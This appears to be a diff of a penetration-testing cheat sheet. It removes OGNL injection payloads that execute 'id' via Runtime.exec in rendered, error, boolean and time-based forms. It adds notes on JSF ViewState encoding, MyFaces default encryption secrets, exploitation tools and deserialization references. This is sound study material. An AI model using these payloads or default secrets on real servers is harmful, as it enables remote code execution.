-### OGNL - Command Execution
+## ViewState
 
-Rendered:
+In Java, ViewState refers to the mechanism used by frameworks like JavaServer Faces (JSF) to maintain the state of UI components between HTTP requests in web applications. There are 2 major implementations:
 
-```java
-new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
+* Oracle Mojarra (JSF reference implementation)
+* Apache MyFaces
+
+**Tools**:
+
+* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool
+* [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace is a software used to patch unencrypted and unsigned JSF ViewStates.
+
+### Encoding
+
+| Encoding      | Starts with |
+| ------------- | ----------- |
+| base64        | `rO0`       |
+| base64 + gzip | `H4sIAAA`   |
+
+### Storage
+
+The `javax.faces.STATE_SAVING_METHOD` is a configuration parameter in JavaServer Faces (JSF). It specifies how the framework should save the state of a component tree (the structure and data of UI components on a page) between HTTP requests.
+
+The storage method can also be inferred from the viewstate representation in the HTML body.
+
+* **Server side** storage: `value="-XXX:-XXXX"`
+* **Client side** storage: `base64 + gzip + Java Object`
+
+### Encryption
+
+By default MyFaces uses DES as encryption algorithm and HMAC-SHA1 to authenticate the ViewState. It is possible and recommended to configure more recent algorithms like AES and HMAC-SHA256.
+
+| Encryption Algorithm | HMAC      |
+| -------------------- | --------- |
+| DES ECB (default)    | HMAC-SHA1 |
+
+Supported encryption methods are BlowFish, 3DES, AES and are defined by a context parameter.
+The value of these parameters and their secrets can be found inside these XML clauses.
+
+```xml
+<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>   
+<param-name>org.apache.myfaces.SECRET</param-name>   
+<param-name>org.apache.myfaces.MAC_SECRET</param-name>
 ```
 
-Error-Based:
+Common secrets from the [documentation](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application).
 
-```java
-(new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes()))/0
-```
+| Name                 | Value                              |
+| -------------------- | ---------------------------------- |
+| AES CBC/PKCS5Padding | `NzY1NDMyMTA3NjU0MzIxMA==`         |
+| DES                  | `NzY1NDMyMTA=<`                    |
+| DESede               | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
+| Blowfish             | `NzY1NDMyMTA3NjU0MzIxMA`           |
+| AES CBC              | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
+| AES CBC IV           | `NzY1NDMyMTA3NjU0MzIxMA==`         |
 
-Boolean-Based:
-
-```java
-1/((@java.lang.Runtime@getRuntime().exec("id").waitFor()==0)?1:0)+""
-```
-
-Time-Based:
-
-```java
-((@java.lang.Runtime@getRuntime().exec("id").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)
-```
+* **Encryption**: Data -> encrypt -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState
+* **Decryption**: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> Data
 
 ## References
 
-- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://web.archive.org/web/20200707130000/https://securitylab.github.com/research/bean-validation-RCE)
-- [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://web.archive.org/web/20230203103413/https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
-- [Expression Language Injection - OWASP - December 4, 2019](https://web.archive.org/web/20200422030628/https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
-- [Expression Language injection - PortSwigger - January 27, 2019](https://web.archive.org/web/20251215015718/https://portswigger.net/kb/issues/00100f20_expression-language-injection)
-- [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://web.archive.org/web/20250219021221/https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
-- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://web.archive.org/web/20240906203847/https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
-- [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://web.archive.org/web/20181207164702/https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
-- [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://web.archive.org/web/20200923134700/https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
-- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://web.archive.org/web/20250810034644/https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
-- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
-- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://web.archive.org/web/20150808084830/https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
-- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://web.archive.org/web/20200501162014/https://www.youtube.com/watch?v=3cT0uE7Y87s)
-- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://web.archive.org/web/20220412162651/https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
-- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
+* [Detecting deserialization bugs with DNS exfiltration - Philippe Arteau - March 22, 2017](https://web.archive.org/web/20230927142712/https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
+* [Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill - October 4, 2017](https://web.archive.org/web/20260303123815/https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/)
+* [Hack The Box - Arkham - 0xRick - August 10, 2019](https://web.archive.org/web/20251125134359/https://0xrick.github.io/hack-the-box/arkham/)
+* [How I found a $1500 worth Deserialization vulnerability - Ashish Kunwar - August 28, 2018](https://web.archive.org/web/20250918030712/https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
+* [Jackson CVE-2019-12384: anatomy of a vulnerability class - Andrea Brancaleoni - July 22, 2019](https://web.archive.org/web/20190724143322/https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
+* [Jackson gadgets - Anatomy of a vulnerability - Andrea Brancaleoni - July 22, 2019](https://web.archive.org/web/20190724143322/https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
+* [Jackson Polymorphic Deserialization - FasterXML - July 23, 2020](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)
+* [Java Deserialization Cheat Sheet - Aleksei Tiurin - May 23, 2023](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
+* [Java Deserialization in ViewState - Haboob Team - December 23, 2020](https://web.archive.org/web/20250909154616/https://www.exploit-db.com/docs/48126)
+* [JSF ViewState upside-down - Renaud Dubourguais, Nicolas Collignon - March 15, 2016](https://web.archive.org/web/20160315020109/http://synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)
+* [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://web.archive.org/web/20181217131654/https://alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
+* [On Jackson CVEs: Don’t Panic — Here is what you need to know - cowtowncoder - December 22, 2017](https://web.archive.org/web/20201207032909/https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)
+* [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin (@artsploit) - June 29, 2021](https://web.archive.org/web/20260210022416/https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
+* [Triggering a DNS lookup using Java Deserialization - paranoidsoftware.com - July 5, 2020](https://web.archive.org/web/20250604040229/https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
+* [Understanding & practicing java deserialization exploits - Diablohorn - September 9, 2017](https://web.archive.org/web/20250604034046/https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
+* [Friday the 13th JSON Attacks - Alvaro Muñoz & Oleksandr Mirosh - July 28, 2017](https://web.archive.org/web/20170728193005/https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
